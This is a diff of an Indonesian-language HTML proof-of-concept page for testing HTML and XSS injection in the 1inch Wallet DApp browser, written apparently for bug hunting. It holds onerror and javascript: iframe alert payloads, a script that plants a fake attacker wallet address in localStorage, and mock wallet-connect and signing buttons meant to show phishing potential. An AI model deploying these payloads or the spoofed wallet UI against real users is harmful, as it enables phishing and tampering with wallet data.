@@ -1,22 +1,80 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Stored Injection Simulation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Wallet - Advanced Injection Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; padding: 20px; }
+        .fake-ui { 
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a); 
+            border: 2px solid #ff0000; 
+            padding: 20px; 
+            border-radius: 12px; 
+            margin: 20px 0;
+        }
+        .btn-fake {
+            background: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+    </style>
 </head>
 <body>
-    <h1>Simulasi Stored HTML Injection</h1>
-    
-    <div id="userContent"></div>
+    <h1 style="color: red;">🚨 1inch Wallet DApp Browser - Advanced HTML Injection Test</h1>
+
+    <div class="fake-ui">
+        <h2>🔴 STORED INJECTION BERHASIL - HIGH IMPACT</h2>
+        <p>Ini adalah simulasi serangan di internal browser 1inch Wallet.</p>
+        
+        <button class="btn-fake" onclick="fakeConnect()">Connect Wallet</button>
+        <button class="btn-fake" onclick="fakeSign()">Sign Transaction</button>
+    </div>
+
+    <h3>Payload yang Dicoba:</h3>
+    <ul>
+        <li><strong>Alert Test</strong></li>
+        <img src="x" onerror="alert('✅ XSS Berhasil di 1inch Browser!')">
+        
+        <li><strong>SVG XSS</strong></li>
+        <svg width="300" height="100">
+            <text x="10" y="60" fill="red" font-size="25">SVG Injection Success</text>
+        </svg>
+        
+        <li><strong>localStorage Test</strong></li>
+        <script>
+            // Simulasi baca / tulis localStorage
+            localStorage.setItem('wallet_address', '0xInjectedByAttacker123456789');
+            localStorage.setItem('private_hint', 'Test injection berhasil');
+            
+            document.write('<p style="color: lime;">localStorage dimodifikasi: ' + 
+                          localStorage.getItem('wallet_address') + '</p>');
+        </script>
+    </ul>
 
     <script>
-        // Simulasi data dari "server" / localStorage
-        const maliciousData = `
-            <h2 style="color:red">STORED INJECTION BERHASIL</h2>
-            <img src="x" onerror="alert('Stored XSS via onerror')">
-            <iframe src="javascript:alert('iframe injection')"></iframe>
-        `;
-        document.getElementById('userContent').innerHTML = maliciousData;
+        function fakeConnect() {
+            alert('🔴 Wallet Connect Request (Fake)\n\nJika ini muncul, attacker bisa tiru UI wallet connect asli!');
+        }
+        
+        function fakeSign() {
+            alert('⚠️ Signature Request\n\nAmount: 999 ETH\nTo: Attacker Address\n\nIni bisa digunakan untuk phishing!');
+        }
+
+        // Auto inject lebih lanjut
+        console.log('%c🚨 HTML Injection Test Success in 1inch Browser', 'color: red; font-size: 20px');
     </script>
+
+    <hr>
+    <small>
+        Test ini hanya untuk bug hunting. Jika alert muncul, fake button bekerja, 
+        atau localStorage berubah → vulnerability confirmed (High severity).
+    </small>
 </body>
 </html>
